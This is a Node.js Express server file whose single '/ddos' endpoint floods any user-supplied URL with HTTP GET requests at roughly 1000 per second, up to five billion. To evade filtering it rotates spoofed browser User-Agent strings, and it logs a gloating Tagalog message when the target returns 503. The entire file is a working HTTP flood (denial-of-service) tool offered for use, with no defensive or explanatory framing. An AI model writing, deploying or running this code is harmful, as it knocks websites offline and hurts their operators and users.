const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;

const userAgents = [
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
    'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
    'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
    'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
    'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
    'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
    'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
    'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413'
];

app.get('/ddos', async (req, res) => {
    const { url } = req.query;

    if (!url) {
        return res.status(400).json({ error: 'URL is required.' });
    }

    let requestCount = 0;
    const maxRequests = 5000000000;
    const requestsPerSecond = 1000;

    const attack = () => {
        try {
            if (requestCount >= maxRequests) {
                console.log('Max requests reached.');
                return;
            }

            const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
            const headers = { 'User-Agent': userAgent };

            axios.get(url, { headers })
                .then((response) => {
                    if (response.status === 503) {
                        console.log("BOOM BAGSAK ANG GAGO HAHAHA ðŸ¤£ðŸ¤£");
                    } else {
                        console.log(`Status Code: ${response.status}`);
                    }
                    requestCount++;
                })
                .catch((error) => {
                    console.log("Error: " + error.message);
                });

            if (requestCount < maxRequests) {
                setTimeout(attack, 1000 / requestsPerSecond);
            }
        } catch (error) {
            console.log("Error: " + error.message);
            setTimeout(attack, 1000 / requestsPerSecond);
        }
    };

    attack();

    res.json({ message: 'DDoS was under attack.' });
});

app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
